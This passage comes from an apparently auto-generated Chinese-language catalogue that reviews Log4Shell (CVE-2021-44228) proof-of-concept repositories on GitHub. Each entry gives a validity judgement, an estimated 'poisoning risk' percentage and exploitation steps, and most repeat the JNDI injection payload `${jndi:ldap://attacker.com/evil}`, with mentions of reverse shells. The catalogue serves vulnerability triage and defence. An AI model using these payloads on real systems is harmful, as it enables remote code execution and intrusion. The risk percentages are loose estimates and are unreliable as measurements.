*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

